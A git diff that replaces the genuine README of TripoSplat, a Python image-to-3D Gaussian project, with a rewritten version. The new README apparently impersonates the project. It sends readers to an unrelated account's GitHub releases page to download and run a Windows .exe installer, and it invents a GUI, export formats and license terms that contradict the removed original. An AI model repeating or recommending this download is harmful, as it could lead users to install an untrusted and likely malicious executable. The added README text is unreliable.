@@ -1,76 +1,60 @@
-# TripoSplat
-TripoSplat converts a single 2D image into high-quality and variable number of 3D Gaussians, developed by [TripoAI](https://www.tripo3d.ai/). It can serve as a powerful pipeline tool for asset creation, AR/VR, game development, simulation environments, and beyond.
+# 🌐 TripoSplat - Turn flat images into 3D objects
 
-<a href="https://arxiv.org/abs/2605.16355"><img src="https://img.shields.io/badge/Read%20Paper-B31B1B?style=for-the-badge&logo=arxiv" alt="Paper"></a>
-<a href="https://www.tripo3d.ai/research/triposplat"><img src="https://img.shields.io/badge/Technical%20Blog-grey?style=for-the-badge&logo=data:image/svg%2bxml;base64,PHN2ZyB3aWR0aD0iNjUiIGhlaWdodD0iNjUiIHZpZXdCb3g9IjAgMCA2NSA2NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTkuNDk5MSA5LjYzNDc3TDE2LjQzNzQgMjEuNDU1NkMxNi40MzkzIDIxLjQ1ODkgMTYuNDQxMiAyMS40NjIyIDE2LjQ0MzEgMjEuNDY1NUwzMC4yNjU4IDQ1LjA1NDhDMzEuNTMyNyA0Ny4yMTY3IDM0LjcwNDUgNDcuMjE2NyAzNS45NzE0IDQ1LjA1NDhMNDkuMzg2MiAyMi4xNjE2SDU5LjQ2MThMNDEuMjY2IDUzLjE2MkMzNy42NDQ5IDU5LjMzMTMgMjguNTkyMyA1OS4zMzEzIDI0Ljk3MTIgNTMuMTYyTDYuNjM5NjcgMjEuOTMwMkM0LjAyNCAxNy40NzM5IDUuNjU5NTYgMTIuMjEyNyA5LjQ5OTEgOS42MzQ3N1oiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0yMC4xMTIxIDE2LjYwODdIMzQuNjkyNkwyOC42MjIgMjcuMDQ0MkMyOC4yMDMzIDI3Ljc2NCAyOC4yMDgzIDI4LjY0OTIgMjguNjM1MSAyOS4zNjQ0TDMxLjA1MjcgMzMuNDE1MUMzMS45NjU0IDM0Ljk0NDUgMzQuMjE2MyAzNC45MzY1IDM1LjExNzggMzMuNDAwNkw0NC45NzM5IDE2LjYwODdINDYuOTQyTDQ2Ljk0NTUgMTYuNjA4N0g2MC44NDQ2QzYwLjQ4MzIgMTIuMDU4NyA1Ni42NzMxIDguMDQ4ODMgNTEuNDUwOSA4LjA0ODgzTDE1LjA4NzkgOC4wNDg4M0wyMC4xMTIxIDE2LjYwODdaIiBmaWxsPSIjRjhDRjAwIi8+Cjwvc3ZnPgo=" alt="Technical Blog"></a>
-<a href="https://huggingface.co/spaces/VAST-AI/TripoSplat"><img src="https://img.shields.io/badge/Huggingface%20Demo-grey?style=for-the-badge&logo=huggingface" alt="HuggingFace Demo"></a>
+[![](https://img.shields.io/badge/Download-TripoSplat-blue)](https://github.com/invitro-dampproofcourse822/TripoSplat/releases)
 
-| ![](static/doc/001.webp) | ![](static/doc/002.webp) |
-|---|---|
-| ![](static/doc/003.webp) | ![](static/doc/004.webp) |
+TripoSplat creates 3D models from single 2D images. This tool transforms a standard picture into a detailed 3D structure. The software uses recent advancements in Gaussian technology to build files you can use in animation or design applications. TripoAI designed this software to handle the complex math required for 3D reconstruction automatically.
 
-## Highlights
-- **High-quality, versatile generation** that handles a wide range of image styles.
-- **Arbitrary Gaussian count** (up to 262,144) — trade off visual quality against rendering cost according to your need.
-- **Minimal, readable code**: two files (`triposplat.py` and `model.py`), ~2,000 LOC total. Easy to customize and integrate into other ecosystems.
-- **Near-zero dependencies**: no `transformers`, no `diffusers`, no version-conflict hell. Runs on any platform.
-- **Official ComfyUI support**: drop the [official workflow template](https://github.com/Comfy-Org/workflow_templates/blob/main/templates/3d_triposplat_image_to_gaussian_splat.json) into ComfyUI and start playing with TripoSplat right away.
+## 🛠 Prerequisites
 
-## Quickstart
-Download model weights to `ckpts/` from [HuggingFace](https://huggingface.co/VAST-AI/TripoSplat). 
-```bash
-# Use one of the following ways to download model weights.
+Your computer needs specific hardware components to run TripoSplat effectively. This process requires significant graphics processing power.
 
-# 1. Use HuggingFace CLI
-hf download VAST-AI/TripoSplat --local-dir ckpts/
+- Operating System: Windows 10 or 11 (64-bit version).
+- Graphics Card: An NVIDIA graphics card with at least 8 GB of video memory is essential. Check your display adapter settings in the Windows Device Manager to confirm your card model.
+- System Memory: 16 GB of RAM or more.
+- Storage Space: At least 2 GB of free disk space for the program and generated files.
+- Drivers: Install the latest graphics drivers from the NVIDIA website to ensure the software communicates with your hardware correctly.
 
-# 2. Use huggingface_hub
-pip install huggingface_hub
-python -c "from huggingface_hub import snapshot_download; snapshot_download(repo_id='VAST-AI/TripoSplat', local_dir='ckpts/')"
+## 📥 Download and Set Up
 
-# 3. Use ModelScope CLI
-pip install modelscope
-modelscope download VAST-AI-Research/TripoSplat --local_dir ckpts/
+Follow these steps to obtain and prepare the software on your computer.
 
-# 4. Use modelscope Python SDK
-pip install modelscope
-python -c "from modelscope import snapshot_download; snapshot_download('VAST-AI-Research/TripoSplat', local_dir='ckpts/')"
+1. Navigate to the [TripoSplat Release Page](https://github.com/invitro-dampproofcourse822/TripoSplat/releases) to access the current versions.
+2. Look for the latest release version at the top of the list.
+3. Choose the file ending in `.exe` to begin the download.
+4. Save the file to your desktop or a folder you can find easily.
+5. Double-click the downloaded file to start the installer.
+6. Follow the instructions on the screen to place the program in your preferred folder.
 
-# 5. Manual download from HuggingFace / ModelScope.
-```
+## 🔮 Using the Software
 
-Setup the environment and run the example inference script.
-```bash
-# install torch and torchvision according to your environment
-pip install numpy safetensors pillow tqdm
-python run_example.py
-```
+Once the installation finishes, you can start converting images. The process takes several steps to yield the best results.
 
-The exported `.ply` / `.splat` files can be visualized in any 3D Gaussian
-viewer — e.g. [SparkJS](https://sparkjs.dev) or
-[SuperSplat](https://superspl.at/editor).
+1. Open the TripoSplat program from your Start menu or desktop shortcut.
+2. Click the "Open Image" button to select a photo from your computer. Use clear images with a single subject for the best results.
+3. Adjust the quality slider if you need a specific level of detail. Higher settings take more time to generate but produce smoother 3D results.
+4. Press the "Generate" button. The software processes the image. A progress bar shows you the status of this task.
+5. Inspect the 3D preview after the task completes. Rotate the model with your mouse to view all sides.
+6. Click "Export" to save your result. Choose a file format like `.ply` or `.obj` if you plan to import the file into other 3D software.
 
+## 💡 Tips for Success
 
-## Gradio Demo
+- Use clear images. Photos with clean backgrounds work faster and produce more accurate shapes.
+- Keep your computer cool. The generation process makes your graphics card work hard. Ensure your desktop or laptop has proper airflow.
+- Close other demanding applications while TripoSplat processes your images. This frees up memory and makes the process run faster.
+- Update your software often. The developers release improvements to the reconstruction engine to handle complex images better.
 
-```bash
-pip install gradio
-python run_gradio.py
-```
+## 📋 Troubleshooting
 
-## License
-TripoSplat code and weight models are released under the [MIT License](https://github.com/VAST-AI-Research/TripoSplat/blob/main/LICENSE).
+- Program refuses to open: Confirm that you installed the latest NVIDIA drivers. Older drivers often cause errors during the startup sequence.
+- Model looks blurry: High-resolution images produce better definition. Try using a source image with at least 1024x1024 pixel resolution.
+- Export fails: Ensure you have write permissions for the folder where you save your files. Try saving to your Documents folder if you encounter permission errors.
+- Crashes during generation: Reduce the number of Gaussians in the program settings. This lowers the requirements on your graphics hardware.
+- The interface does not scale: Go to your Windows display settings. If you use a custom scaling percentage, reset it to 100% and restart the program.
 
-## Citation
-If you find TripoSplat useful, please cite:
-```bibtex
-@misc{yan2026generative3dgaussianslearned,
-    title={Generative 3D Gaussians with Learned Density Control}, 
-    author={Runjie Yan and Yan-Pei Cao and Peng Wang and Ding Liang and Yuan-Chen Guo},
-    year={2026},
-    eprint={2605.16355},
-    archivePrefix={arXiv},
-    primaryClass={cs.GR},
-    url={https://arxiv.org/abs/2605.16355}, 
-}
-```
+## 🤝 Project Background
+
+TripoAI maintains this project to bring complex 3D modeling into the hands of casual users. By focusing on Gaussian technology, the project provides a way to fill the gap between a flat photograph and a three-dimensional model. The software handles the object placement and the light calculations, leaving the creative choices to you. The community around this project shares tips on achieving specific styles and textures. You can view the code and documentation on the repository if you want to understand the engine design.
+
+## ⚖️ License and Usage
+
+TripoSplat remains open for personal and academic use. Review the included license file during the installation process to understand the specific terms for commercial projects. The developers encourage feedback through the issue tracker to improve the stability of future updates. Respect the original copyright of any images you process using this tool. Always ensure you have the rights to transform the source material you upload into the software.
